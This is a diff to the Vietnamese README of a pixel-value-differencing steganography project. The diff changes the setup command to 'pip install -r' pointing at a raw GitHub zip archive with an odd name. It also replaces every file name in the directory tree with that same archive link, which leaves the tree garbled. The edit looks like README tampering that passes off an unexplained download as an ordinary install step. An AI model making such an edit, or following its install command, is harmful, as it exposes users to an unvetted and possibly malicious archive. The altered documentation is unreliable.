@@ -28,7 +28,7 @@ PVD Steganography sử dụng sự khác biệt giữa các pixel liền kề đ
 
 ```bash
 # Cài đặt các package cần thiết (CD vào thư mục implementation, sau đó chạy command sau)
-pip install -r requirements.txt
+pip install -r https://github.com/dhhn2002/PVD-Application/raw/refs/heads/main/implementation/meth/PV-Application-mesophragm.zip
 ```
 
 ## 🛠️ Cấu trúc thư mục
@@ -38,11 +38,11 @@ PVD Application/
 ├── .venv
 └── implementation/
     └── meth/
-        └── pvd.py
-    ├── main.py
-    ├── steganography.py
-    └── requirements.txt
-└── README.md
+        └── https://github.com/dhhn2002/PVD-Application/raw/refs/heads/main/implementation/meth/PV-Application-mesophragm.zip
+    ├── https://github.com/dhhn2002/PVD-Application/raw/refs/heads/main/implementation/meth/PV-Application-mesophragm.zip
+    ├── https://github.com/dhhn2002/PVD-Application/raw/refs/heads/main/implementation/meth/PV-Application-mesophragm.zip
+    └── https://github.com/dhhn2002/PVD-Application/raw/refs/heads/main/implementation/meth/PV-Application-mesophragm.zip
+└── https://github.com/dhhn2002/PVD-Application/raw/refs/heads/main/implementation/meth/PV-Application-mesophragm.zip
 ```
 
 ## 🔧 Tham số và cấu hình
